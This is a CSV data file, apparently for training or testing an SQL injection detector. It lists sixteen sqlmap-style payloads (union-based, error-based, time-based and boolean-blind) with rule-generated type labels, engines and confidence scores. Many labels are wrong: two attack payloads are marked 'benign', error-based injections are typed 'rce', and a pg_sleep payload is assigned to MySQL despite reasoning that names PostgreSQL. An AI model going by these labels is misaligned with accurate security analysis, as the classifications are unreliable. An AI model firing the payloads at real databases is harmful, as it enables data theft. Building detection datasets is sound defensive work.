row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
4230,"1 ) or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers detected — heavy_query injection (priority 6) on generic",rule-based
4231,"1%"" ) and 8626 = 3626#",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4232,"iif ( 5214 = 7412,1,1/0 )",1,,unknown,unknown,0.5,Insufficient information to classify,rule-based
4233,"1' ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( 'nuil' like 'nuil",1,,boolean_blind,generic,0.95,") and (, like ' detected — boolean_blind injection (priority 8) on generic",rule-based
4234,"1' ) ) ) or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
4235,1'|| ( select 'rhcv' where 6228 = 6228,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4236,select pg_sleep ( 5 ) and ( ( 4382 = 4382,1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
4237,"1' ) ) ) and make_set ( 8403 = 8403,8899 ) and ( ( ( 'oacz' = 'oacz",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
4238,"-6951"" union all select 2518,2518,2518,2518,2518,2518,2518,2518--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
4239,"1'+ ( select mems where 5091 = 5091 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) ) +'",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
4240,"1 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) # cqqs",1,,rce,mysql,0.95,0x7171706a71 detected — rce injection (priority 1) on mysql,rule-based
4241,"1'|| ( select 'ltqo' where 9080 = 9080 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) ) ||'",1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
4242,"1'+ ( select 'otqy' where 2754 = 2754 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) ) +'",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
4243,"1 ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( 3626 = 3626",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
4244,"1' and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and 'qcsi' = 'qcsi",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
4245,"1 ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( 5776 = 5776",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
